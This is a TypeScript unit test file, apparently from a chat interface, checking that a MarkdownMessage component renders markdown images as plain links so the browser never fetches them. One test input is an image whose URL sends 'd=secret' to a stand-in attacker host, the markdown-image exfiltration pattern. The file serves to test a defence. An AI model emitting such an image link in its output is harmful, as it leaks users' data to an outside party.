import { describe, expect, test } from "bun:test"
import { renderToStaticMarkup } from "react-dom/server"
import { MarkdownMessage } from "./markdown"

describe("MarkdownMessage images", () => {
  test("renders an image as a link, never an <img> the browser would fetch", () => {
    const html = renderToStaticMarkup(
      <MarkdownMessage content={"See ![chart](https://attacker.example/p.png?d=secret) here"} />
    )
    expect(html).not.toContain("<img")
    expect(html).toContain('href="https://attacker.example/p.png?d=secret"')
    expect(html).toContain("chart")
  })

  test("falls back to the host when alt text is empty", () => {
    const html = renderToStaticMarkup(<MarkdownMessage content={"![](https://cdn.example/a.png)"} />)
    expect(html).not.toContain("<img")
    expect(html).toContain("cdn.example")
  })
})
